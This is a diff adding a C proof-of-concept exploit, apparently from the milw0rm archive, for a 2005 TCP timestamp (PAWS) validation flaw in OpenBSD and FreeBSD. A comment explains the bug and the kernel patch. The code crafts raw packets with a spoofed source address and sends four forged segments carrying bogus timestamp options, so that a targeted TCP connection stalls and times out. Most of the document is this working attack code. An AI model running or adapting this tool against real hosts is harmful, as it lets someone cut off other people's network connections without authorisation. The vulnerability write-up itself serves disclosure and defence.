@@ -1,0 +1,255 @@
+/*
+* TCP does not adequately validate segments before updating timestamp value
+* http://www.kb.cert.org/vuls/id/637934
+*
+* RFC-1323 (TCP Extensions for High Performance)
+*
+* 4.2.1 defines how the PAWS algorithm should drop packets with invalid
+* timestamp options:
+* 
+* R1) If there is a Timestamps option in the arriving segment
+* and SEG.TSval < TS.Recent and if TS.Recent is valid (see
+* later discussion), then treat the arriving segment as not
+* acceptable:
+*
+* Send an acknowledgement in reply as specified in
+* RFC-793 page 69 and drop the segment.
+*
+* 3.4 defines what timestamp options to accept:
+*
+* (2) If Last.ACK.sent falls within the range of sequence numbers
+* of an incoming segment:
+*
+* SEG.SEQ <= Last.ACK.sent < SEG.SEQ + SEG.LEN
+*
+* then the TSval from the segment is copied to TS.Recent;
+* otherwise, the TSval is ignored.
+*
+* http://community.roxen.com/developers/idocs/drafts/
+* draft-jacobson-tsvwg-1323bis-00.html
+*
+* 3.4 suggests an slightly different check like
+*
+* (2) If: SEG.TSval >= TSrecent and SEG.SEQ <= Last.ACK.sent
+* then SEG.TSval is copied to TS.Recent; otherwise, it is
+* ignored.
+*
+* and explains this change
+*
+* APPENDIX C: CHANGES FROM RFC-1072, RFC-1185, RFC-1323
+*
+* There are additional changes in this document from RFC-1323.
+* These changes are:
+* (b) In RFC-1323, section 3.4, step (2) of the algorithm to control
+* which timestamp is echoed was incorrect in two regards:
+* (1) It failed to update TSrecent for a retransmitted segment
+* that resulted from a lost ACK.
+* (2) It failed if SEG.LEN = 0.
+* In the new algorithm, the case of SEG.TSval = TSrecent is
+* included for consistency with the PAWS test.
+*
+* At least OpenBSD and FreeBSD contain this code instead:
+*
+* sys/netinet/tcp_input.c tcp_input()
+*
+* **
+* * If last ACK falls within this segment's sequence numbers,
+* * record its timestamp.
+* * NOTE that the test is modified according to the latest
+* * proposal of the tcplw@cray.com list (Braden 1993/04/26).
+* **
+* if ((to.to_flags & TOF_TS) != 0 &&
+* SEQ_LEQ(th->th_seq, tp->last_ack_sent)) {
+* tp->ts_recent_age = ticks;
+* tp->ts_recent = to.to_tsval;
+* }
+*
+* The problem here is that the packet the timestamp is accepted from doesn't
+* need to have a valid th_seq or th_ack. This point of execution is reached
+* for packets with arbitrary th_ack values and th_seq values of half the
+* possible value range, because the first 'if (todrop > tlen)' check in the
+* function explicitely continues execution to process ACKs.
+*
+* If an attacker knows (or guesses) the source and destination addresses and
+* ports of a connection between two peers, he can send spoofed TCP packets
+* to either peer containing bogus timestamp options. Since half of the
+* possible th_seq and timestamp values are accepted, four packets containing
+* two random values and their integer wraparound opposites are sufficient to
+* get one random timestamp accepted by the receipient. Further packets from
+* the real peer will get dropped by PAWS, and the TCP connection stalls and
+* times out.
+*
+* The following change reverts the tcp_input() check back to the implemented
+* suggested by draft-jacobson-tsvwg-1323bis-00.txt
+*
+* if (opti.ts_present && TSTMP_GEQ(opti.ts_val, tp->ts_recent) &&
+* SEQ_LEQ(th->th_seq, tp->last_ack_sent)) {
+* + if (SEQ_LEQ(tp->last_ack_sent, th->th_seq + tlen +
+* + ((tiflags & (TH_SYN|TH_FIN)) != 0)))
+* + tp->ts_recent = opti.ts_val;
+* + else
+* + tp->ts_recent = 0;
+* tp->ts_recent_age = tcp_now;
+* - tp->ts_recent = opti.ts_val;
+* }
+*
+* I can't find Braden's proposal referenced in the comment. It seems to
+* pre-date draft-jacobson-tsvwg-1323bis-00.txt and might be outdated by
+* it.
+*
+* Fri Mar 11 02:33:36 MET 2005 Daniel Hartmeier <daniel@benzedrine.cx>
+*
+* http://www.openbsd.org/cgi-bin/cvsweb/src/sys/netinet/tcp_input.c.diff\
+* ?r1=1.184&r2=1.185&f=h
+*
+* http://www.freebsd.org/cgi/cvsweb.cgi/src/sys/netinet/tcp_input.c.diff\
+* ?r1=1.252.2.15&r2=1.252.2.16&f=h
+*
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#ifdef __FreeBSD__
+#include <net/if_var.h>
+#endif
+#include <netinet/in.h>
+#include <netinet/in_var.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+
+static u_int16_t
+checksum(u_int16_t *data, u_int16_t length)
+{
+u_int32_t value = 0;
+u_int16_t i;
+
+for (i = 0; i < (length >> 1); ++i)
+value += data[i];
+if ((length & 1) == 1)
+value += (data[i] << 8);
+value = (value & 65535) + (value >> 16);
+return (~value);
+}
+
+static int
+send_tcp(int sock, u_int32_t saddr, u_int32_t daddr, u_int16_t sport,
+u_int16_t dport, u_int32_t seq, u_int32_t ts)
+{
+u_char packet[1600];
+struct tcphdr *tcp;
+struct ip *ip;
+unsigned char *opt;
+int optlen, len, r;
+struct sockaddr_in sin;
+
+memset(packet, 0, sizeof(packet));
+
+opt = packet + sizeof(struct ip) + sizeof(struct tcphdr);
+optlen = 0;
+opt[optlen++] = TCPOPT_NOP;
+opt[optlen++] = TCPOPT_NOP;
+opt[optlen++] = TCPOPT_TIMESTAMP;
+opt[optlen++] = 10;
+ts = htonl(ts);
+memcpy(opt + optlen, &ts, sizeof(ts));
+optlen += sizeof(ts);
+ts = htonl(0);
+memcpy(opt + optlen, &ts, sizeof(ts));
+optlen += sizeof(ts);
+
+len = sizeof(struct ip) + sizeof(struct tcphdr) + optlen;
+
+ip = (struct ip *)packet;
+ip->ip_src.s_addr = saddr;
+ip->ip_dst.s_addr = daddr;
+ip->ip_p = IPPROTO_TCP;
+ip->ip_len = htons(sizeof(struct tcphdr) + optlen);
+
+tcp = (struct tcphdr *)(packet + sizeof(struct ip));
+tcp->th_sport = htons(sport);
+tcp->th_dport = htons(dport);
+tcp->th_seq = htonl(seq);
+tcp->th_ack = 0;
+tcp->th_off = (sizeof(struct tcphdr) + optlen) / 4;
+tcp->th_flags = 0;
+tcp->th_win = htons(16384);
+tcp->th_sum = 0;
+tcp->th_urp = 0;
+
+tcp->th_sum = checksum((u_int16_t *)ip, len);
+
+ip->ip_v = 4;
+ip->ip_hl = 5;
+ip->ip_tos = 0;
+ip->ip_len = htons(len);
+ip->ip_id = htons(arc4random() % 65536);
+ip->ip_off = 0;
+ip->ip_ttl = 64;
+
+sin.sin_family = AF_INET;
+sin.sin_addr.s_addr = saddr;
+
+r = sendto(sock, packet, len, 0, (struct sockaddr *)&sin, sizeof(sin));
+if (r != len) {
+perror("sendto");
+return (1);
+}
+
+return (0);
+}
+
+static u_int32_t
+op(u_int32_t u)
+{
+return (u_int32_t)(((u_int64_t)u + 2147483648UL) % 4294967296ULL);
+}
+
+int main(int argc, char *argv[])
+{
+u_int32_t saddr, daddr, seq, ts;
+u_int16_t sport, dport;
+int sock, i;
+
+if (argc != 5) {
+fprintf(stderr, "usage: %s <src ip> <src port> "
+"<dst ip> <dst port>\n", argv[0]);
+return (1);
+}
+
+saddr = inet_addr(argv[1]);
+daddr = inet_addr(argv[3]);
+sport = atoi(argv[2]);
+dport = atoi(argv[4]);
+
+sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+if (sock < 0) {
+perror("socket");
+return (1);
+}
+i = 1;
+if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) == -1) {
+perror("setsockopt");
+close(sock);
+return (1);
+}
+
+seq = arc4random();
+ts = arc4random();
+if (send_tcp(sock, saddr, daddr, sport, dport, seq, ts) ||
+send_tcp(sock, saddr, daddr, sport, dport, seq, op(ts)) ||
+send_tcp(sock, saddr, daddr, sport, dport, op(seq), ts) ||
+send_tcp(sock, saddr, daddr, sport, dport, op(seq), op(ts))) {
+fprintf(stderr, "failed\n");
+close(sock);
+return (1);
+}
+
+close(sock);
+printf("done\n");
+return (0);
+}
+
+// milw0rm.com [2005-05-21]
